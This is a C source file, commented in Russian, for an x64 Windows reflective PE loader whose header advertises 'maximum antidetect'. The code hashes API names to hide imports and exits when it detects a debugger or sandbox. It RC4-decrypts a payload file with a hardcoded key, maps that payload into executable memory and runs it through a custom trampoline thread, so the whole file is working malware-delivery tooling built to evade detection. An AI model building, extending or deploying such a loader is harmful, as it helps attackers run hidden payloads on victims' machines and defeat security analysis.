// loader_template_x64.c
// Reflective PE Loader для 64-битных PE-файлов (x64)
// Максимальный антидетект: API hashing, junk-код, анти-анализ, in-memory execution
// Поддержка x64 native PE без временных файлов

#define _AMD64_
#define _WIN64
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <signal.h> // Required for signal handling

#define _AMD64_  // Required for CONTEXT structure
#define _WIN64   // Required for x64-specific code
#define _CRT_SECURE_NO_WARNINGS  // Ignore security warnings

// Определяем структуры для NtCreateThreadEx
typedef struct _PS_ATTRIBUTE {
    ULONG_PTR Attribute;
    SIZE_T Size;
    union {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

#define PS_ATTRIBUTE_THREAD_CONTEXT 0x00040000

typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PPS_ATTRIBUTE_LIST AttributeList
);

typedef VOID (NTAPI *pRtlInitializeContext)(
    HANDLE Process,
    PCONTEXT Context,
    PVOID Parameter,
    PVOID InitialPc,
    PVOID InitialSp
);

#include "payload_data.h"

unsigned char AES_KEY_SVxmJQ7X[32] = { 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42 };

void log_message(const char* msg) {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    char* last_slash = strrchr(exe_path, '\\');
    if (last_slash) *(last_slash + 1) = 0;
    char log_path[MAX_PATH];
    sprintf(log_path, "%sloader_debug.txt", exe_path);
    FILE* f = fopen(log_path, "a");
    if (f) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d] %s\n", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, msg);
        fclose(f);
    }
}

// Расширенное логирование
void log_debug(const char* format, ...) {
    char buffer[1024];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    log_message(buffer);
}

unsigned long hash_api(const char* str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

FARPROC resolve_api(HMODULE hModule, unsigned long api_hash) {
    if (!hModule) return NULL;
    unsigned char* base = (unsigned char*)hModule;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)(base + exp->AddressOfNames);
    WORD* ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)(base + names[i]);
        if (hash_api(name) == api_hash) {
            WORD ord = ordinals[i];
            return (FARPROC)(base + functions[ord]);
        }
    }
    return NULL;
}

typedef HMODULE (WINAPI* pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI* pGetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID (WINAPI* pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI* pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL (WINAPI* pVirtualFree)(LPVOID, SIZE_T, DWORD);

typedef void (*EntryPoint_t)(void);

// Forward declarations
void reflective_load_pe64(unsigned char* pe_data);

// Функция для отслеживания состояния потока
DWORD WINAPI ThreadMonitor(LPVOID lpParameter) {
    HANDLE hThread = (HANDLE)lpParameter;
    char buffer[256];
    BOOL first_check = TRUE;
    DWORD start_time = GetTickCount();
    DWORD timeout = 30000; // 30 seconds timeout
    
    while (TRUE) {
        DWORD current_time = GetTickCount();
        if (current_time - start_time > timeout) {
            log_message("thread_monitor: timeout reached");
            break;
        }

        DWORD exitCode;
        if (GetExitCodeThread(hThread, &exitCode)) {
            if (exitCode == STILL_ACTIVE) {
                if (first_check) {
                    sprintf(buffer, "thread_monitor: thread started and running");
                    log_message(buffer);
                    first_check = FALSE;
                }
            } else {
                sprintf(buffer, "thread_monitor: thread exited with code 0x%08x", exitCode);
                log_message(buffer);
                break;
            }
        } else {
            DWORD error = GetLastError();
            if (error == ERROR_INVALID_HANDLE) {
                log_message("thread_monitor: thread handle is invalid or closed");
            } else {
                sprintf(buffer, "thread_monitor: GetExitCodeThread failed with error %d", error);
                log_message(buffer);
            }
            break;
        }

        // Check thread context if possible
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER; // Get registers too
        if (SuspendThread(hThread) != (DWORD)-1) {
            if (GetThreadContext(hThread, &ctx)) {
                #ifdef _WIN64
                sprintf(buffer, "thread_monitor: RIP=0x%llx, RAX=0x%llx, RCX=0x%llx, RDX=0x%llx",
                        ctx.Rip, ctx.Rax, ctx.Rcx, ctx.Rdx);
                #else
                sprintf(buffer, "thread_monitor: EIP=0x%x, EAX=0x%x, ECX=0x%x, EDX=0x%x",
                        ctx.Eip, ctx.Eax, ctx.Ecx, ctx.Edx);
                #endif
                log_message(buffer);
            } else {
                DWORD error = GetLastError();
                sprintf(buffer, "thread_monitor: GetThreadContext failed with error %d", error);
                log_message(buffer);
            }
            ResumeThread(hThread);
        } else {
            DWORD error = GetLastError();
            sprintf(buffer, "thread_monitor: SuspendThread failed with error %d", error);
            log_message(buffer);
        }

        Sleep(1000); // Check every second
    }
    
    return 0;
}

// Добавляем новые функции для расшифровки

void sha256_hash(const unsigned char* data, size_t len, unsigned char* hash) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    DWORD hash_len = 32;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        log_debug("CryptAcquireContext failed: %d", GetLastError());
        return;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        log_debug("CryptCreateHash failed: %d", GetLastError());
        CryptReleaseContext(hProv, 0);
        return;
    }

    if (!CryptHashData(hHash, data, len, 0)) {
        log_debug("CryptHashData failed: %d", GetLastError());
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return;
    }

    if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &hash_len, 0)) {
        log_debug("CryptGetHashParam failed: %d", GetLastError());
    }

    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}

void rc4_decrypt(unsigned char* data, size_t data_len, const unsigned char* key, size_t key_len) {
    unsigned char stretched_key[32];
    unsigned char S[256];
    int i, j = 0;
    unsigned char temp;
    
    // Key stretching через SHA-256
    sha256_hash(key, key_len, stretched_key);
    
    // Инициализация RC4
    for (i = 0; i < 256; i++) {
        S[i] = i;
    }
    
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + stretched_key[i % 32]) & 0xFF;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }
    
    // Расшифровка
    i = j = 0;
    for (size_t k = 0; k < data_len; k++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        
        data[k] ^= S[(S[i] + S[j]) & 0xFF];
    }
}

void decrypt_payload(unsigned char* data, unsigned int size, const unsigned char* key, size_t key_len) {
    log_message("decrypt_payload: начало расшифровки");
    char msg[256];
    sprintf(msg, "размер данных: %d байт", size);
    log_message(msg);

    // Расшифровка RC4
    rc4_decrypt(data, size, key, key_len);

    // Проверка DOS сигнатуры
    if (size >= 0x40) {
        WORD dos_sig = *(WORD*)data;
        sprintf(msg, "DOS сигнатура после расшифровки: 0x%04X", dos_sig);
        log_message(msg);

        if (dos_sig == 0x5A4D) {  // 'MZ'
            DWORD pe_offset = *(DWORD*)(data + 0x3C);
            if (pe_offset + 4 <= size) {
                DWORD pe_sig = *(DWORD*)(data + pe_offset);
                sprintf(msg, "PE сигнатура после расшифровки: 0x%08X", pe_sig);
                log_message(msg);
            }
        }
    }

    sprintf(msg, "decrypt_payload: расшифровка завершена, размер=%d", size);
    log_message(msg);
}

int is_debugger_present() {
    // Проверка IsDebuggerPresent
    if (IsDebuggerPresent()) return 1;
    
    // Проверка PEB для x64
    #ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);  // x64 использует GS:[0x60]
    #else
    PPEB peb = (PPEB)__readfsdword(0x30);  // x86 использует FS:[0x30]
    #endif
    if (peb->BeingDebugged) return 1;
    
    return 0;
}

int is_sandbox() {
    // Проверка времени работы системы
    DWORD uptime = GetTickCount();
    if (uptime < 600000) return 1; // < 10 минут
    
    return 0;
}

void run_payload(const char* filename) {
    log_message("run_payload: start");
    
    if (is_debugger_present()) {
        log_message("run_payload: debugger detected");
        return;
    }
    
    if (is_sandbox()) {
        log_message("run_payload: sandbox detected");
        return;
    }
    
    log_message("run_payload: anti-analysis passed");
    
    // Read file
    FILE* f = fopen(filename, "rb");
    if (!f) {
        log_message("run_payload: failed to open file");
        return;
    }
    
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    unsigned char* payload = (unsigned char*)malloc(size);
    if (!payload) {
        log_message("run_payload: malloc failed");
        fclose(f);
        return;
    }
    
    if (fread(payload, 1, size, f) != size) {
        log_message("run_payload: read failed");
        free(payload);
        fclose(f);
        return;
    }
    
    fclose(f);
    
    log_debug("размер данных: %d байт", size);
    
    // Decrypt
    decrypt_payload(payload, size, AES_KEY_SVxmJQ7X, sizeof(AES_KEY_SVxmJQ7X));
    log_message("run_payload: payload decrypted");
    
    // Load and execute
    reflective_load_pe64(payload);
    
    free(payload);
}

void reflective_load_pe64(unsigned char* pe_data) {
    log_message("reflective_load_pe64: start");
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    pLoadLibraryA LoadLibraryA_f = (pLoadLibraryA)resolve_api(hKernel32, hash_api("LoadLibraryA"));
    pGetProcAddress GetProcAddress_f = (pGetProcAddress)resolve_api(hKernel32, hash_api("GetProcAddress"));
    pVirtualAlloc VirtualAlloc_f = (pVirtualAlloc)resolve_api(hKernel32, hash_api("VirtualAlloc"));
    pVirtualProtect VirtualProtect_f = (pVirtualProtect)resolve_api(hKernel32, hash_api("VirtualProtect"));
    pVirtualFree VirtualFree_f = (pVirtualFree)resolve_api(hKernel32, hash_api("VirtualFree"));
    
    if (!LoadLibraryA_f || !GetProcAddress_f || !VirtualAlloc_f || !VirtualProtect_f || !VirtualFree_f) {
        log_message("reflective_load_pe64: API resolve failed");
        return;
    }
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe_data;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        log_message("reflective_load_pe64: invalid DOS signature");
        return;
    }
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe_data + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        log_message("reflective_load_pe64: invalid NT signature");
        return;
    }
    ULONGLONG image_base = nt->OptionalHeader.ImageBase;
    SIZE_T image_size = nt->OptionalHeader.SizeOfImage;
    LPVOID base = VirtualAlloc_f((LPVOID)image_base, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!base) {
        base = VirtualAlloc_f(NULL, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    }
    if (!base) {
        log_message("reflective_load_pe64: VirtualAlloc failed");
        return;
    }
    log_message("reflective_load_pe64: memory allocated");
    memcpy(base, pe_data, nt->OptionalHeader.SizeOfHeaders);
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)((BYTE*)nt + sizeof(IMAGE_NT_HEADERS64));
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sections[i].SizeOfRawData > 0) {
            memcpy((BYTE*)base + sections[i].VirtualAddress, pe_data + sections[i].PointerToRawData, sections[i].SizeOfRawData);
        }
    }
    log_message("reflective_load_pe64: sections copied");
    if ((ULONGLONG)base != image_base) {
        ULONGLONG delta = (ULONGLONG)base - image_base;
        IMAGE_DATA_DIRECTORY* reloc_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (reloc_dir->Size > 0) {
            IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)base + reloc_dir->VirtualAddress);
            while (reloc->VirtualAddress) {
                WORD* entries = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
                int count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                for (int i = 0; i < count; i++) {
                    if ((entries[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                        ULONGLONG* addr = (ULONGLONG*)((BYTE*)base + reloc->VirtualAddress + (entries[i] & 0xFFF));
                        *addr += delta;
                    }
                }
                reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
            }
        }
    }
    log_message("reflective_load_pe64: relocations processed");
    IMAGE_DATA_DIRECTORY* import_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (import_dir->Size > 0) {
        IMAGE_IMPORT_DESCRIPTOR* import_desc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)base + import_dir->VirtualAddress);
        while (import_desc->Name) {
            char* dll_name = (char*)base + import_desc->Name;
            HMODULE dll = LoadLibraryA_f(dll_name);
            if (dll) {
                ULONGLONG* thunk = (ULONGLONG*)((BYTE*)base + import_desc->FirstThunk);
                ULONGLONG* orig_thunk = (ULONGLONG*)((BYTE*)base + import_desc->OriginalFirstThunk);
                while (*thunk) {
                    if (*orig_thunk & IMAGE_ORDINAL_FLAG64) {
                        *thunk = (ULONGLONG)GetProcAddress_f(dll, (LPCSTR)(*orig_thunk & 0xFFFF));
                    } else {
                        IMAGE_IMPORT_BY_NAME* import_name = (IMAGE_IMPORT_BY_NAME*)((BYTE*)base + (*orig_thunk));
                        *thunk = (ULONGLONG)GetProcAddress_f(dll, import_name->Name);
                    }
                    thunk++;
                    orig_thunk++;
                }
            }
            import_desc++;
        }
    }
    log_message("reflective_load_pe64: imports resolved");
    
    // Устанавливаем правильные права доступа для каждой секции
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD protect = PAGE_READWRITE; // По умолчанию
        
        // Определяем права доступа на основе характеристик секции
        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE)
                protect = PAGE_EXECUTE_READWRITE;
            else
                protect = PAGE_EXECUTE_READ;
        }
        else if (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE)
            protect = PAGE_READWRITE;
        else if (sections[i].Characteristics & IMAGE_SCN_MEM_READ)
            protect = PAGE_READONLY;
            
        DWORD old_protect;
        LPVOID section_addr = (LPVOID)((BYTE*)base + sections[i].VirtualAddress);
        SIZE_T section_size = sections[i].Misc.VirtualSize;
        
        char section_msg[256];
        sprintf(section_msg, "reflective_load_pe64: setting protection for section %d at 0x%p (size: 0x%zx, protect: 0x%x)",
                i, section_addr, section_size, protect);
        log_message(section_msg);
        
        if (!VirtualProtect_f(section_addr, section_size, protect, &old_protect)) {
            char error_msg[256];
            sprintf(error_msg, "reflective_load_pe64: failed to set protection for section %d, error: %lu",
                    i, GetLastError());
            log_message(error_msg);
            return;
        }
    }
    
    log_message("reflective_load_pe64: all sections protected");
    
    // Проверяем и логируем entry point
    ULONGLONG entry_point = (ULONGLONG)base + nt->OptionalHeader.AddressOfEntryPoint;
    char ep_msg[256];
    sprintf(ep_msg, "reflective_load_pe64: entry point at 0x%llx (base: 0x%llx, offset: 0x%x)", 
            entry_point, (ULONGLONG)base, nt->OptionalHeader.AddressOfEntryPoint);
    log_message(ep_msg);
    
    // Проверяем что entry point в пределах загруженной памяти
    if (entry_point < (ULONGLONG)base || entry_point >= ((ULONGLONG)base + nt->OptionalHeader.SizeOfImage)) {
        log_message("reflective_load_pe64: ERROR - entry point outside of loaded image");
        return;
    }
    
    log_message("reflective_load_pe64: entry point validation passed");
    
    // Определяем тип PE (EXE или DLL)
    BOOL is_dll = (nt->FileHeader.Characteristics & IMAGE_FILE_DLL) != 0;
    char type_msg[128];
    sprintf(type_msg, "reflective_load_pe64: file type: %s", is_dll ? "DLL" : "EXE");
    log_message(type_msg);
    
    // Проверяем память entry point
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery((LPVOID)entry_point, &mbi, sizeof(mbi))) {
        char ep_info[256];
        sprintf(ep_info, "reflective_load_pe64: entry point memory info - State: 0x%x, Protect: 0x%x, Type: 0x%x",
                mbi.State, mbi.Protect, mbi.Type);
        log_message(ep_info);
        
        if ((mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE)) == 0) {
            log_message("reflective_load_pe64: ERROR - entry point is not executable!");
            return;
        }
    }
    
    if (is_dll) {
        // Для DLL вызываем DllMain
        typedef BOOL (WINAPI *DllMain_t)(HMODULE, DWORD, LPVOID);
        DllMain_t dll_main = (DllMain_t)entry_point;
        BOOL result = dll_main((HMODULE)base, DLL_PROCESS_ATTACH, NULL);
        if (result) {
            log_message("reflective_load_pe64: DllMain executed successfully");
        } else {
            log_message("reflective_load_pe64: DllMain failed");
        }
    } else {
        log_message("reflective_load_pe64: creating thread for EXE entry point");

        // Структура параметров
        typedef struct _THREAD_DATA {
            LPVOID entry_point;
            LPVOID base;
            LPVOID cmdline;
            int show_cmd;
        } THREAD_DATA, *PTHREAD_DATA;

        // Выделяем память для параметров
        LPVOID param_block = VirtualAlloc_f(NULL, sizeof(THREAD_DATA), 
                                        MEM_COMMIT | MEM_RESERVE, 
                                        PAGE_READWRITE);
        if (!param_block) {
            log_message("reflective_load_pe64: failed to allocate parameter block");
            return;
        }

        // Заполняем параметры
        PTHREAD_DATA params = (PTHREAD_DATA)param_block;
        params->entry_point = (LPVOID)entry_point;
        params->base = (LPVOID)base;
        params->cmdline = NULL;
        params->show_cmd = SW_SHOW;

        char param_msg[256];
        sprintf(param_msg, "reflective_load_pe64: params - entry: 0x%p, base: 0x%p, cmd: 0x%p, show: %d",
                params->entry_point, params->base, params->cmdline, params->show_cmd);
        log_message(param_msg);

        // Создаем трамплин
        LPVOID trampoline_addr = VirtualAlloc_f(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!trampoline_addr) {
            log_message("reflective_load_pe64: failed to allocate trampoline memory");
            VirtualFree_f(param_block, 0, MEM_RELEASE);
            return;
        }

        // Проверяем память трамплина
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(trampoline_addr, &mbi, sizeof(mbi))) {
            char tramp_msg[256];
            sprintf(tramp_msg, "reflective_load_pe64: trampoline protection - State: 0x%lx, Protect: 0x%lx, Type: 0x%lx",
                    mbi.State, mbi.Protect, mbi.Type);
            log_message(tramp_msg);
        }

        // Трамплин с правильным сохранением регистров
        BYTE trampoline[] = {
            // Пролог с правильным выравниванием
            0x48, 0x83, 0xEC, 0x38,                 // sub rsp, 56 ; shadow space
            0x48, 0x83, 0xE4, 0xF0,                // and rsp, -16 ; align first
            0x48, 0x89, 0x4C, 0x24, 0x30,          // mov [rsp+48], rcx ; save params at known offset

            // Сохраняем регистры
            0x53,                                   // push rbx
            0x55,                                   // push rbp
            0x56,                                   // push rsi
            0x57,                                   // push rdi
            0x41, 0x54,                            // push r12
            0x41, 0x55,                            // push r13
            0x41, 0x56,                            // push r14
            0x41, 0x57,                            // push r15

            // Загружаем параметры из структуры (скорректированные смещения)
            0x48, 0x8B, 0x4C, 0x24, 0x78,          // mov rcx, [rsp+120] ; adjusted offset
            0x48, 0x8B, 0x01,                       // mov rax, [rcx] ; entry point
            0x48, 0x8B, 0x51, 0x08,                // mov rdx, [rcx+8] ; base
            0x4C, 0x8B, 0x41, 0x10,                // mov r8, [rcx+16] ; cmdline
            0x44, 0x8B, 0x49, 0x18,                // mov r9d, [rcx+24] ; show_cmd

            // Вызываем entry point
            0xFF, 0xD0,                            // call rax

            // Сохраняем результат
            0x48, 0x89, 0x44, 0x24, 0x28,          // mov [rsp+40], rax

            // Восстанавливаем регистры
            0x41, 0x5F,                            // pop r15
            0x41, 0x5E,                            // pop r14
            0x41, 0x5D,                            // pop r13
            0x41, 0x5C,                            // pop r12
            0x5F,                                   // pop rdi
            0x5E,                                   // pop rsi
            0x5D,                                   // pop rbp
            0x5B,                                   // pop rbx

            // Эпилог
            0x48, 0x8B, 0x44, 0x24, 0x28,          // mov rax, [rsp+40] ; restore result
            0x48, 0x83, 0xC4, 0x38,                // add rsp, 56
            0xC3                                    // ret
        };

        // Копируем трамплин
        memcpy(trampoline_addr, trampoline, sizeof(trampoline));

        // Меняем защиту на исполняемую
        DWORD old_protect;
        if (!VirtualProtect_f(trampoline_addr, sizeof(trampoline), PAGE_EXECUTE_READ, &old_protect)) {
            log_message("reflective_load_pe64: failed to set trampoline protection");
            VirtualFree_f(param_block, 0, MEM_RELEASE);
            VirtualFree_f(trampoline_addr, 0, MEM_RELEASE);
            return;
        }

        char tramp_addr[128];
        sprintf(tramp_addr, "reflective_load_pe64: trampoline created at 0x%p", trampoline_addr);
        log_message(tramp_addr);

        // Создаем поток
        DWORD thread_id = 0;
        HANDLE hThread = CreateThread(
            NULL,                // Security attributes
            0x100000,           // Stack size (1MB)
            (LPTHREAD_START_ROUTINE)trampoline_addr,
            param_block,        // Параметры
            0,                  // Запускаем сразу
            &thread_id          // Thread ID
        );

        if (!hThread) {
            DWORD error = GetLastError();
            char error_msg[128];
            sprintf(error_msg, "reflective_load_pe64: CreateThread failed with error %lu", error);
            log_message(error_msg);
            VirtualFree_f(param_block, 0, MEM_RELEASE);
            VirtualFree_f(trampoline_addr, 0, MEM_RELEASE);
            return;
        }

        {
            char msg[128];
            sprintf(msg, "reflective_load_pe64: main thread created with ID %lu", thread_id);
            log_message(msg);
        }

        // Создаем поток-монитор
        HANDLE hMonitor = CreateThread(NULL, 0, ThreadMonitor, hThread, 0, NULL);
        if (hMonitor == NULL) {
            char msg[128];
            sprintf(msg, "reflective_load_pe64: CreateMonitorThread failed with error %lu", GetLastError());
            log_message(msg);
        } else {
            char msg[128];
            sprintf(msg, "reflective_load_pe64: monitor thread created with handle 0x%p", hMonitor);
            log_message(msg);
            // Отсоединяем монитор, чтобы он мог завершиться самостоятельно
            CloseHandle(hMonitor);
        }

        // Ждем завершения основного потока
        DWORD waitResult = WaitForSingleObject(hThread, 30000); // 30 секунд таймаут
        if (waitResult == WAIT_TIMEOUT) {
            log_message("reflective_load_pe64: main thread timeout");
        } else if (waitResult == WAIT_FAILED) {
            char msg[128];
            sprintf(msg, "reflective_load_pe64: WaitForSingleObject failed with error %lu", GetLastError());
            log_message(msg);
        } else {
            DWORD exitCode;
            if (GetExitCodeThread(hThread, &exitCode)) {
                char msg[128];
                sprintf(msg, "reflective_load_pe64: main thread exited with code 0x%08x", exitCode);
                log_message(msg);
            }
        }

        // Закрываем handle основного потока
        CloseHandle(hThread);

        // Сохраняем информацию для очистки
        HANDLE cleanup_handles[2] = { hThread, NULL };
        LPVOID cleanup_memory[2] = { param_block, trampoline_addr };

        char thread_msg[128];
        sprintf(thread_msg, "reflective_load_pe64: thread created successfully, ID: %lu", thread_id);
        log_message(thread_msg);

        // Ждем завершения потока с таймаутом
        if (WaitForSingleObject(hThread, 30000) == WAIT_TIMEOUT) {
            log_message("reflective_load_pe64: thread execution timeout");
        }

        // Очищаем ресурсы
        CloseHandle(hThread);
        VirtualFree_f(param_block, 0, MEM_RELEASE);
        VirtualFree_f(trampoline_addr, 0, MEM_RELEASE);
    }
    
    log_message("reflective_load_pe64: loader completed");
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // DLL mode is not supported
        return FALSE;
    }
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        MessageBoxA(NULL, "Usage: loader.exe <encrypted_file>", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    run_payload(argv[1]);
    return 0;
} 